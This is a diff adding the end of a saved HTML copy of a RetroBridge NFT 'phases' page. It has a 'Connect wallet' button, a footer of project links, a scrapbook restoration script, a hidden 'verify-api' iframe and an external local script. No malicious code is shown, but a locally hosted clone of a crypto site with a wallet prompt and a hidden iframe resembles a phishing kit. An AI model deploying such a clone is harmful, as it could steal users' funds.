+														aria-labelledby="radix-:rl:"
+														data-orientation="vertical"
+														class="phase-page-accordion--content-wrapper"
+														style="--radix-accordion-content-height: var(--radix-collapsible-content-height); --radix-accordion-content-width: var(--radix-collapsible-content-width);"
+													></div>
+												</div>
+											</div>
+										</div>
+									</div>
+									<div class="col-12 col-lg-6 order-1 order-lg-2">
+										<div class="phase-page-card--wrapper">
+											<div class="phase-page-card--wrapper-bg"></div>
+											<div class="phase-page-card">
+												<div class="phase-page-card--image">
+													<video src="cardVideo2.a28d6c1aa720093973cd.mp4" autoplay="" playsinline="" disablepictureinpicture="" loop="" poster="cardImage2.bf5e0b33961e7fa7e215.png"></video>
+												</div>
+												<div class="phase-page-card--content">
+													<div class="phase-page-card-badge">
+														<span><span class="fw-normal">Get NFT Reward</span></span>
+													</div>
+													<h5 class="phase-page-card--heading">Retro Bridge Midday</h5>
+													<hr class="phase-page-card--divider" />
+													<div class="d-flex justify-content-between">
+														<span class="phase-page-card--info w-100">
+															<div class="d-flex align-items-center w-100">
+																<div class="flex-grow-1">
+																	<strong>2</strong> of 4 RetroBridge<br />
+																	Phases NFTs
+																</div>
+																<div class="phases-NFTs-progress ms-auto">
+																	<img src="Sunrise.0e7c67df59b8157e8635.png" class="phases-NFTs-progress-item active" alt="" />
+																	<img src="Midday.d7425502c45641086b4e.png" class="phases-NFTs-progress-item active" alt="" />
+																	<img src="SunsetJourneyFilter3.41d9f24f72b9108cf706.png" class="phases-NFTs-progress-item" alt="" />
+																	<img src="MidnightJourneyFilter3.f31249e2f622c9775626.png" class="phases-NFTs-progress-item" alt="" />
+																</div>
+															</div>
+														</span>
+														<span class="phase-page-card--price"><span class="line-through"></span><span></span></span>
+													</div>
+												</div>
+												<button class="phase-page-card--btn w-100">Connect wallet</button>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</article>
+					</div>
+					<div class="phase-page-footer">
+						<footer class="footer footer-mt">
+							<div class="footer-nav">
+								<a class="footer-nav-item" href="https://retrobridge.io/faq">
+									<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 14 14" fill="none">
+										<path
+											d="M7.0005 0C3.13579 0 0.000488281 3.13135 0.000488281 6.99632C0.000488281 10.865 3.13579 14 7.00047 14C10.8673 14 13.9999 10.865 13.9999 6.99632C14 3.13135 10.8673 0 7.0005 0ZM7.49932 10.8913C7.33675 11.036 7.14833 11.1087 6.93489 11.1087C6.71406 11.1087 6.52143 11.0373 6.357 10.8942C6.19232 10.7514 6.10981 10.5514 6.10981 10.2944C6.10981 10.0665 6.18966 9.87464 6.34883 9.71916C6.50801 9.56369 6.70326 9.48595 6.93489 9.48595C7.16282 9.48595 7.35467 9.56369 7.51041 9.71916C7.66589 9.87464 7.74389 10.0665 7.74389 10.2944C7.7436 10.5477 7.66216 10.7467 7.49932 10.8913ZM9.52654 5.86557C9.40163 6.0972 9.25328 6.29693 9.08121 6.46534C8.90965 6.63372 8.60109 6.91673 8.15573 7.31464C8.03293 7.4269 7.93412 7.52545 7.86008 7.61029C7.78603 7.69542 7.73069 7.77313 7.69458 7.84377C7.65821 7.91437 7.63029 7.98501 7.61052 8.05562C7.59074 8.12597 7.56098 8.2501 7.52066 8.42743C7.45216 8.80374 7.23687 8.99186 6.87505 8.99186C6.68689 8.99186 6.52879 8.93046 6.39992 8.8074C6.27158 8.68434 6.20755 8.50173 6.20755 8.2593C6.20755 7.95548 6.25472 7.69221 6.3488 7.46956C6.44236 7.24688 6.56753 7.05163 6.723 6.88325C6.87874 6.71487 7.08849 6.5151 7.35279 6.28347C7.58442 6.08083 7.75177 5.92801 7.85479 5.82495C7.95808 5.72167 8.0448 5.60678 8.11514 5.48028C8.18604 5.35352 8.22083 5.21623 8.22083 5.06789C8.22083 4.77829 8.11359 4.53428 7.89804 4.33533C7.68275 4.13638 7.40499 4.03676 7.06479 4.03676C6.66663 4.03676 6.3736 4.13716 6.18544 4.33796C5.99729 4.53875 5.83841 4.83441 5.70795 5.22521C5.58464 5.6342 5.35116 5.83866 5.00778 5.83866C4.80514 5.83866 4.63413 5.76725 4.49473 5.62441C4.35559 5.48158 4.28602 5.32691 4.28602 5.16038C4.28602 4.81674 4.39644 4.46837 4.61701 4.11553C4.83785 3.76269 5.15986 3.47044 5.58331 3.23907C6.00649 3.00744 6.50061 2.89148 7.06479 2.89148C7.58945 2.89148 8.05245 2.98845 8.45404 3.18215C8.85564 3.37555 9.16605 3.63882 9.38503 3.97189C9.60376 4.30469 9.71336 4.66652 9.71336 5.05732C9.71388 5.36435 9.65144 5.63394 9.52654 5.86557Z"
+											fill="currentColor"
+										></path>
+									</svg>
+									FAQs
+								</a>
+								<a class="footer-nav-item" href="https://retrobridge.io/terms-conditions">
+									<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 12" fill="none">
+										<g clip-path="url(#clip0_8591_10830)">
+											<path d="M7 0V3.49995H10.5L7 0Z" fill="currentColor"></path>
+											<path
+												d="M7.00005 4.50005C6.44774 4.50005 6 4.05184 6 3.5V0.000488281H2.50005C1.94774 0.000488281 1.5 0.447793 1.5 1.0001V10.9991C1.5 11.5518 1.94774 11.999 2.50005 11.999L9.49995 12C10.0518 12 10.5 11.5518 10.5 11V4.50005H7.00005Z"
+												fill="currentColor"
+											></path>
+										</g>
+										<defs>
+											<clipPath id="clip0_8591_10830"><rect width="12" height="12" fill="white"></rect></clipPath>
+										</defs>
+									</svg>
+									Terms &amp; Privacy
+								</a>
+								<a class="footer-nav-item" href="https://retrobridge.io/for-developers">
+									<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 14 14" fill="none">
+										<path
+											d="M13.144 5.00074C12.1434 4.83441 11.4397 3.85328 11.5516 2.81333C11.5668 2.67244 11.5969 2.53382 11.6416 2.40013C11.7575 2.0472 11.6385 1.63951 11.3522 1.38394C10.7471 0.830591 10.061 0.385298 9.32085 0.0655268C9.15942 -0.0065714 8.97991 -0.0195882 8.81072 0.0285351C8.64153 0.0766585 8.4923 0.183175 8.38666 0.331238C7.80087 1.16082 6.67224 1.30628 5.91007 0.658668C5.79798 0.563194 5.69766 0.453191 5.61143 0.331238C5.50578 0.183175 5.35656 0.0766585 5.18737 0.0285351C5.01818 -0.0195882 4.83867 -0.0065714 4.67724 0.0655268C3.99453 0.359958 3.3575 0.761519 2.78753 1.25673C2.48671 1.5152 2.36201 1.93883 2.48398 2.30364C2.825 3.26188 2.36447 4.38557 1.42891 4.79558C1.26222 4.86927 1.0864 4.91719 0.906846 4.93786C0.529998 4.98741 0.217416 5.28267 0.141117 5.66371C-0.0303834 6.46937 -0.0457345 7.30353 0.0959932 8.11567C0.162174 8.50916 0.478858 8.81805 0.867192 8.86904C1.86811 8.98147 2.61251 9.91914 2.54852 10.9626C2.53614 11.1722 2.48989 11.378 2.41178 11.5711C2.26383 11.9336 2.37869 12.3731 2.68525 12.6403C3.28631 13.184 3.96565 13.6223 4.69748 13.9384C4.78835 13.9753 4.88436 13.9961 4.98162 13.9998C5.11342 14.0026 5.24374 13.9699 5.36045 13.905C5.47716 13.8401 5.57648 13.7449 5.64917 13.6284C5.80497 13.3804 6.01523 13.1763 6.26191 13.0334C6.50858 12.8905 6.78429 12.8132 7.06538 12.8081C7.34646 12.803 7.62451 12.8703 7.87566 13.0041C8.1268 13.1379 8.34354 13.3344 8.50726 13.5765C8.61241 13.7349 8.76646 13.8494 8.94281 13.9003C9.11915 13.9512 9.30673 13.9353 9.47317 13.8553C10.1419 13.541 10.764 13.1254 11.3199 12.6214C11.6115 12.3607 11.7302 11.9431 11.6052 11.5856C11.2538 10.6314 11.7028 9.50333 12.6326 9.08405C12.7898 9.01242 12.9554 8.96369 13.1249 8.93917C13.4974 8.87861 13.7995 8.57928 13.8685 8.20057C13.9493 7.80476 13.9934 7.40152 14 6.99661C13.9999 6.56929 13.9577 6.14315 13.8739 5.72514C13.8039 5.35453 13.5083 5.06216 13.144 5.00074ZM9.33261 6.99661C9.33261 8.35385 8.27918 9.46798 6.99904 9.46914C5.71891 9.4703 4.66658 8.35385 4.66548 6.99661C4.66439 5.63937 5.71891 4.52495 6.99904 4.52379C8.27918 4.52263 9.33151 5.63821 9.33261 6.99661Z"
+											fill="currentColor"
+										></path>
+									</svg>
+									API
+								</a>
+								<button type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-:r8:" data-state="closed" class="footer-nav-item footer-audits-menu--trigger">
+									Audits<svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7 9.33333L3.96891 5.83333L10.0311 5.83333L7 9.33333Z" fill="white"></path></svg>
+								</button>
+							</div>
+							<div class="footer-audits">
+								<a class="footer-audits-item" href="https://retrobridge.io/audit.pdf" target="_blank">
+									<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="none">
+										<path d="M10 0L1.20752 2.50879V6.91676C1.20752 12.5791 4.57213 17.6788 9.76557 19.9062L10 20L10.2345 19.9062C15.4279 17.6788 18.7925 12.5791 18.7925 6.91676V2.50879L10 0Z" fill="#4C3DA6"></path>
+										<path d="M18.7925 2.50879V6.91676C18.7925 12.5791 15.4279 17.6788 10.2345 19.9062L10 20V0L18.7925 2.50879Z" fill="#7A72B0"></path>
+										<path
+											d="M10.0001 2.43848L3.55225 4.27906V6.9168C3.55225 11.2544 5.92041 15.2169 9.71873 17.2802L10.0001 17.4326L10.2815 17.2802C14.0798 15.2169 16.4479 11.2544 16.4479 6.9168V4.27906L10.0001 2.43848Z"
+											fill="white"
+											fill-opacity="0.32"
+										></path>
+										<path d="M16.4478 4.27906V6.9168C16.4478 11.2544 14.0796 15.2169 10.2813 17.2802L10 17.4326V2.43848L16.4478 4.27906Z" fill="white" fill-opacity="0.2"></path>
+										<g clip-path="url(#clip0_8572_6464)">
+											<path
+												d="M11.75 8.75H8.25C7.97386 8.75 7.75 8.97386 7.75 9.25V11C7.75 11.2761 7.97386 11.5 8.25 11.5H11.75C12.0261 11.5 12.25 11.2761 12.25 11V9.25C12.25 8.97386 12.0261 8.75 11.75 8.75Z"
+												fill="#4130A9"
+												stroke="#4130A9"
+												stroke-width="0.5"
+												stroke-linecap="round"
+												stroke-linejoin="round"
+											></path>
+											<path
+												d="M8.75 8.75V7.75C8.75 7.41848 8.8817 7.10054 9.11612 6.86612C9.35054 6.6317 9.66848 6.5 10 6.5C10.3315 6.5 10.6495 6.6317 10.8839 6.86612C11.1183 7.10054 11.25 7.41848 11.25 7.75V8.75"
+												stroke="#4130A9"
+												stroke-width="0.5"
+												stroke-linecap="round"
+												stroke-linejoin="round"
+											></path>
+										</g>
+										<mask id="mask0_8572_6464" maskUnits="userSpaceOnUse" x="10" y="2" width="7" height="16" style="mask-type: alpha;">
+											<path d="M16.4478 4.27906V6.9168C16.4478 11.2544 14.0796 15.2169 10.2813 17.2802L10 17.4326V2.43848L16.4478 4.27906Z" fill="white" fill-opacity="0.8"></path>
+										</mask>
+										<g mask="url(#mask0_8572_6464)">
+											<g clip-path="url(#clip1_8572_6464)">
+												<path
+													d="M11.75 8.75H8.25C7.97386 8.75 7.75 8.97386 7.75 9.25V11C7.75 11.2761 7.97386 11.5 8.25 11.5H11.75C12.0261 11.5 12.25 11.2761 12.25 11V9.25C12.25 8.97386 12.0261 8.75 11.75 8.75Z"
+													fill="white"
+													stroke="white"
+													stroke-width="0.5"
+													stroke-linecap="round"
+													stroke-linejoin="round"
+												></path>
+												<path
+													d="M8.75 8.75V7.75C8.75 7.41848 8.8817 7.10054 9.11612 6.86612C9.35054 6.6317 9.66848 6.5 10 6.5C10.3315 6.5 10.6495 6.6317 10.8839 6.86612C11.1183 7.10054 11.25 7.41848 11.25 7.75V8.75"
+													stroke="white"
+													stroke-width="0.5"
+													stroke-linecap="round"
+													stroke-linejoin="round"
+												></path>
+											</g>
+										</g>
+										<defs>
+											<clipPath id="clip0_8572_6464"><rect width="6" height="6" fill="white" transform="translate(7 6)"></rect></clipPath>
+											<clipPath id="clip1_8572_6464"><rect width="6" height="6" fill="white" transform="translate(7 6)"></rect></clipPath>
+										</defs>
+									</svg>
+									<span><span class="text-white fw-bold bold">BezuhlyiE</span> Security Audit</span>
+								</a>
+								<a class="footer-audits-item" aria-label="PeckShield Security Monitoring" href="https://retrobridge.io/security-monitoring.pdf" target="_blank">
+									<img src="0b3fe8052b1f4e2b7d7631397a3593e92c9af872.png" draggable="false" alt="" />Security Monitoring
+								</a>
+							</div>
+							<div class="footer-socials">
+								<a href="https://docs.retrobridge.io/" target="_blank" rel="noreferrer" class="footer-socials-item"><img src="gitbook.8b33b8099ddbb11a8dcd37e26ad68fd2.svg" alt="logo" style="width: 16px; height: 16px;" /></a>
+								<a href="https://github.com/retro-bridge" target="_blank" rel="noopener noreferrer" class="footer-socials-item">
+									<img src="github.8a54ffb785216caccc757723d92f2354.svg" alt="logo" style="width: 14px; height: 14px;" />
+								</a>
+								<a href="https://retro-bridge.medium.com/" target="_blank" rel="noopener noreferrer" class="footer-socials-item">
+									<img src="medium.934f78accf873555c20f0e606a14dac8.svg" alt="logo" style="width: 14px; height: 14px;" />
+								</a>
+								<a href="https://twitter.com/retro_bridge" target="_blank" rel="noopener noreferrer" class="footer-socials-item">
+									<img src="c87a18bc16d910db77755a9aefadfb6ecb1ae2d9.png" alt="logo" style="width: 14px; height: 14px;" />
+								</a>
+								<a href="https://discord.gg/retrobridge" target="_blank" rel="noopener noreferrer" class="footer-socials-item">
+									<img src="discord2.7cc29986a701f75e71c790e3a10a5826.svg" alt="logo" style="width: 16px; height: 16px;" />
+								</a>
+							</div>
+						</footer>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div id="tc-widget-root"><tc-root></tc-root></div>
+		<div id="ookdjilphngeeeghgngjabigmpepanpl"></div>
+		<iframe id="verify-api" src="index_1.html" style="display: none;"></iframe>
+		<wcm-modal
+			data-scrapbook-adoptedstylesheets="0,1"
+			data-scrapbook-shadowdom='<!----><wcm-explorer-context data-scrapbook-shadowdom="<!---->"></wcm-explorer-context><wcm-theme-context data-scrapbook-shadowdom="<!---->"></wcm-theme-context><div id="wcm-modal" role="alertdialog" aria-modal="true" class=" wcm-overlay "><div class="wcm-container" tabindex="0"><!--?lit$7492265921$--></div></div>'
+		></wcm-modal>
+		<script data-scrapbook-elem="basic-loader">
+			(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", k8 = "data-scrapbook-adoptedstylesheets", k9 = /^data-scrapbook-adoptedstylesheet-(\d+)$/, k10 = "data-scrapbook-shadowdom-mode", k11 = "data-scrapbook-shadowdom-clonable", k12 = "data-scrapbook-shadowdom-delegates-focus", k13 = "data-scrapbook-shadowdom-serializable", k14 = "data-scrapbook-shadowdom-slot-assignment", k15 = "data-scrapbook-slot-assigned", k16 = "data-scrapbook-slot-index", k17 = /^scrapbook-slot-index=(\d+)$/; k18 = '/scrapbook-slot-index'; d = document, r = d.documentElement, $s = !!r.attachShadow, $as = !!d.adoptedStyleSheets, $c = !!window.HTMLCanvasElement, $sa = !!d.createElement('slot').assign, sle = [], sls = [], slt = function (r) { if ($sa) { var E = r.childNodes, i, e, s, m; for (i = 0; i < E.length; i++) { e = E[i]; if (e.nodeType === 8) { s = e.nodeValue; if (m = s.match(k17)) { s = e.nextSibling; if (s.nodeType === 3) { sls[m[1]] = s; } r.removeChild(e); i--; } else if (s === k18) { r.removeChild(e); i--; } } } } }, sl = function () { var i = sle.length, j, d, e; while (i--) { d = sle[i]; e = d.elem; d = d.value.split(','); j = d.length; while (j--) { d[j] = sls[parseInt(d[j], 10)]; } try { e.assign.apply(e, d); } catch (ex) { console.error(ex); } } }, asl = (function (r) { var l = [], E, i, e, m, c, j; if ($as) { E = r.attributes; i = E.length; while (i--) { e = E[i]; if (!(m = e.nodeName.match(k9))) { continue; } c = l[m[1]] = new CSSStyleSheet(); r.removeAttribute(m[0]); m = e.nodeValue.split('\n\n'); j = m.length; while (j--) { try { m[j] && c.insertRule(m[j]); } catch (ex) { console.error(ex); } } } } return l; })(r), as = function (d, e) { var l, i, I; if ($as && (l = e.getAttribute(k8)) !== null) { l = l.split(','); for (i = 0, I = l.length; i < I; i++) { d.adoptedStyleSheets.push(asl[l[i]]); } e.removeAttribute(k8); } }, fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s, m; while (i--) { e = E[i]; s = e.shadowRoot; if ($s && (d = e.getAttribute(k1))) { if (!s) { try { s = e.attachShadow({ mode: (m = e.getAttribute(k10)) !== null ? m : 'open', clonable: e.hasAttribute(k11), delegatesFocus: e.hasAttribute(k12), serializable: e.hasAttribute(k13), slotAssignment: (m = e.getAttribute(k14)) !== null ? m : void(0), }); s.innerHTML = d; } catch (ex) { console.error(ex); } } e.removeAttribute(k1); e.removeAttribute(k10); e.removeAttribute(k11); e.removeAttribute(k12); e.removeAttribute(k13); e.removeAttribute(k14); } if ($c && (d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if ($sa && (d = e.getAttribute(k15)) !== null) { sle.push({elem: e, value: d}); e.removeAttribute(k15); } if ($sa && (d = e.getAttribute(k16)) !== null) { sls[d] = e; e.removeAttribute(k16); } if (s) { slt(e); as(s, e); fn(s); } } }; as(d, r); fn(d); sl(); })()
+		</script>
+	<script charset="UTF-8" async type="text/javascript" src="./1df07.4fcab24256a8afe0.js"></script>
+	</body>
+</html>
